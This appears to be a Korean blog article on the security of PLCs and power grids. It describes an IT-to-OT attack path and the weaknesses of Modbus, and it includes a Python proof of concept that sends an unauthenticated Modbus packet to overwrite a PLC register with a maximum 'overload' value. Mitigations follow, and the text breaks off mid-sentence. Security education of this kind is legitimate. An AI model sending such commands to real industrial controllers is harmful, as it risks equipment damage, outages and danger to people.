---
title: "PLC 및 전력망 보안: 실패하는 사이버 보안 모델과 위협 분석"
date: 2026-04-30T01:07:36+09:00
draft: false
categories: ["보안"]
tags: ["보안"]
author: "Intelligence Agent"
---

## 서론

2015년 12월, 우크라이나의 겨울은 평소와 달랐습니다. 해커들이 전력망에 침투하여 수십만 가구의 전기를 끊어버렸기 때문입니다. 이 사건은 단순한 정전이 아닌, 현대 사회의 가장 취약한 동맥인 '산업 제어 시스템(ICS)'이 얼마나 무방비 상태인지를 전 세계에 각인시킨 사건이었습니다. 당시 공격자들은 단순히 서버를 마비시킨 것이 아니라, 변전소의 차단기를 원격 조작하여 물리적 스위치를 내려버렸습니다.

우리는 흔히 "내부망은 인터넷과 분리되어 있으니 안전하다"는 막연한 믿음, 일명 '에어갭(Air-gap) 신화'에 안주하고 있습니다. 하지만 클라우드와 IoT의 확산으로 IT(정보 기술)와 OT(운영 기술)의 경계가 허물어지는 지금, 이 신화는 산산조각 나고 있습니다. 이제 공격자는 피싱 메일 하나로 기업 사무실의 IT 망을 거쳐, 공장 라인의 PLC(프로그래머블 로직 컨트롤러)까지 직접 조종할 수 있습니다. 본 기사에서는 방어 목적의 관점에서, PLC 및 전력망을 겨냥한 정교한 공격 시나리오를 분석하고, 왜 기존의 보안 모델이 붕괴하고 있는지 그 구조적 결함을 파헤치겠습니다.

## 본론

### IT-OT 융합과 보안 모델의 부조화

전통적인 사이버 보안 모델은 '경계 방어(Perimeter Defense)'에 집중해 왔습니다. 즉, 성벽을 높게 쌓고(방화벽), 입구를 지키는(게이트웨이) 방식입니다. 그러나 OT 환경은 가용성(Availability)과 안전성(Safety)이 최우선이기 때문에, PC처럼 백신을 설치하거나 패치를 자주 업데이트하는 것 자체가 위험으로 간주됩니다. 이로 인해 많은 PLC와 SCADA 시스템은 20년 전에 개발된 펌웨어 그대로 운영되고 있으며, 암호화나 인증 프로토콜조차 제대로 적용되지 않는 경우가 허다합니다.

### 공격 시나리오: 사무실에서 발전소까지

*(이 섹션은 방어적 관점에서의 취약점 분석을 위한 시나리오입니다.)*

공격자는 일반적으로 IT 영역에서 발판을 마련한 뒤, OT 영역으로 횡적 이동(Lateral Movement)을 시도합니다.

아래는 공격자가 외부에서 침투하여 PLC의 로직을 변조하기까지의 전형적인 경로를 나타낸 것입니다.

```javascript
graph LR
    A[Phishing Email] --> B[IT Workstation Compromise]
    B --> C[Lateral Movement to Internal Network]
    C --> D[Jump Server Access]
    D --> E[OT Network Intrusion]
    E --> F[SCADA Server Compromise]
    F --> G[MPLC Logic Injection]
    G --> H[Physical Damage / Power Outage]
```

1.  **초기 침투**: 직원의 피싱 메일 클릭을 통해 IT 망에 악성코드 배포.
2.  **횡적 이동**: 내부 네트워크를 탐색하여 OT 관리자가 사용하는 점프 서버(Jump Server)나 VDI(Virtual Desktop Infrastructure) 탈취.
3.  **OT 침투**: IT와 OT를 연결하는 계층(L3 계층)의 라우터나 방화벽 설정을 우회하여 SCADA 서버에 도달.
4.  **공격 수행**: SCADA 서버를 통해 PLC에 악성 로직(Logic Bomb)을 다운로드하여 전력망 과부하 유도.

### 취약점 분석: 프로토콜의 무방비함

대부분의 산업용 프로토콜(Modbus, DNP3, S7 등)은 설계 당시 보안보다는 속도와 신뢰성에 중점을 두었습니다. 따라서 평문 통신을 사용하며, 명령을 내리는 사용자가 누구인지 확인하는 인증 절차가 없습니다.

다음은 Python을 사용하여 가상의 PLC에 악성 명령을 보내는 PoC(개념 증명) 코드 예시입니다. 이 코드는 인증 없이 PLC의 레지스터 값을 변경하여 물리적 장비를 제어할 수 있음을 시연합니다.

```python
import socket

# 방어적 목적의 학습용 코드입니다.
# 실제 시스템에서 승인 없이 실행하는 것은 불법입니다.

def send_malicious_modbus_command(plc_ip, port):
    """
    Modbus 프로토콜을 사용하여 특정 레지스터에 과부하 값을 쓰는 함수.
    실제 공격에서는 터빈 속도를 제어하는 레지스터를 겨냥할 수 있습니다.
    """
    try:
        # 소켓 생성 및 연결
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((plc_ip, port))

        # Modbus TCP 요청 프레임 구성 (간략화)
        # Transaction ID: 0x0001, Protocol ID: 0x0000, Length: 0x0006, Unit ID: 0x01
        # Function Code: 0x06 (Write Single Register)
        # Register Address: 0x0000, Value: 0xFFFF (Max Speed/Overload)
        malicious_packet = bytes.fromhex(
            "0001" "0000" "0006" "01" "06" "0000" "FFFF"
        )

        # 악성 패킷 전송
        sock.send(malicious_packet)
        print(f"[+] Packet sent to {plc_ip}:{port}")
        print("[!] Potential: PLC logic register overwritten to Max Value.")

        # 응답 수신 (확인용)
        response = sock.recv(1024)
        print(f"[+] Received response: {response.hex()}")

        sock.close()

    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    # 테스트 환경의 대상 IP
    TARGET_PLC = "192.168.1.100"
    TARGET_PORT = 502
    send_malicious_modbus_command(TARGET_PLC, TARGET_PORT)
```

이 코드는 복잡한 우회 기술 없이 소켓 통신만으로 레지스터 값을 덮어씌울 수 있음을 보여줍니다. 현장에서는 이러한 간단한 명령이 냉각수 펌프를 멈추거나 변압기를 폭발시킬 수 있습니다.

### 보안 모델 비교: 과거 vs 미래

실패하는 보안 모델의 문제점과 필요한 현대화된 접근법을 비교해 보겠습니다.

| 비교 항목 | 전통적인 보안 모델 (Legacy) | 현대화된 보안 모델 (Modern) |
| :--- | :--- | :--- |
| **신뢰 경계(Trust)** | 내부망은 신뢰할 수 있다고 가정 (Zero Trust 미적용) | 내부망 포함 모든 트래픽 불신 (제로 트러스트) |
| **위협 대응** | 알려진 시그니처(바이러스) 기반 탐지 | 행동 기반 이상 징후 탐지 (Anomaly Detection) |
| **가용성 중심** | 패치/업데이트 지양 (시스템 중단 두려움) | 가상 패칭, 무빙 타겟 디펜스(MTD) 등 비침해적 기법 적용 |
| **가시성** | OT 트래픽을 '블랙박스'로 취급 | 딥 패킷 인스펙션(DPI)으로 프로토콜 페이로드 분석 |
| **사고 대응** | 사후 대응 및 포렌식 중심 | 실시간 차단 및 자가 치유(Self-Healing) |

### 완화 조치 및 실무 적용 가이드

기존 방화벽과 백신으로는 위의 공격을 막을 수 없습니다. 다음은 현장에서 즉시 적용할 수 있는 심층 방어 전략입니다.

**Step 1: 네트워크 분할 (Segmentation) 강화** 단순한 VLAN 분리로는 부족합니다. 퍼듀 모델(Purdue Model)을 준수하여 계층별로 물리적/논리적으로 엄격히 격리해야 합니다. 특히 DMZ(Demilitarized Zone)를 두어 IT와 OT가 직접 통신하지 않도록 중개해야 합니다.

**Step 2: 수동 엔지니어링 최소화** 엔지니어가 USB를 꽂아 PLC를 프로그래밍하는 행위 자체가 리스크입니다. 안전한 원격 액세스 솔루션을 도입하여, 모든 명령어를 기록하고 감사(Audit)할 수 있는 환경을 구축해야 합니다.

**Step 3: 무빙 타겟 디펜스 (Moving Target Defense) 적용** 공격자가 시스템의 구조를 파악하지 못하도록 주기적으로 IP를 변경하거나, 메모리 주소를 무작위화(ASLR)하는 기술적 난이

---

**출처**: [https://news.google.com/rss/articles/CBMilwFBVV95cUxQV19Jclhoakl0ZEF5MFlkcklKZzdJbkJtTG1XcVlrSFJEaGdrU0xGQ2N2R3N4d0VHdXg4aTlMZzdmZHFUaHJuc29OY0V6OEVSUnBvWGZJMXdMcGxVeGFYRW5uN2ljczNzd3k2ZnNwdVgxQ3VwTUxmVm1uenhjWnR2b0h2MVotM1JndW5BR1ZtY25mWExSTHhv?oc=5](https://news.google.com/rss/articles/CBMilwFBVV95cUxQV19Jclhoakl0ZEF5MFlkcklKZzdJbkJtTG1XcVlrSFJEaGdrU0xGQ2N2R3N4d0VHdXg4aTlMZzdmZHFUaHJuc29OY0V6OEVSUnBvWGZJMXdMcGxVeGFYRW5uN2ljczNzd3k2ZnNwdVgxQ3VwTUxmVm1uenhjWnR2b0h2MVotM1JndW5BR1ZtY25mWExSTHhv?oc=5)